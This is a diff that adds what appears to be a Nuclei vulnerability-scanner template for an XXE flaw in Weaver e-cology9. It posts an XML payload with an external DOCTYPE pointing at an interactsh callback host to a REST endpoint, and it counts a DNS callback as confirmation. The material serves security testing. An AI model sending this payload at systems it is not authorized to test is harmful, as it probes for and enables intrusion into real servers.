@@ -1,0 +1,26 @@
+id: poc-yaml-weaver-cology9-xxe
+info:
+  name: 泛微e-cology9 XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: DNSLOG,xxe
+http:
+  - method: POST
+    path:
+      - "/rest/ofs/ReceiveCCRequestByXml"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+      <M><syscode>&send;</syscode></M>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: status
+        status:
+          - 200
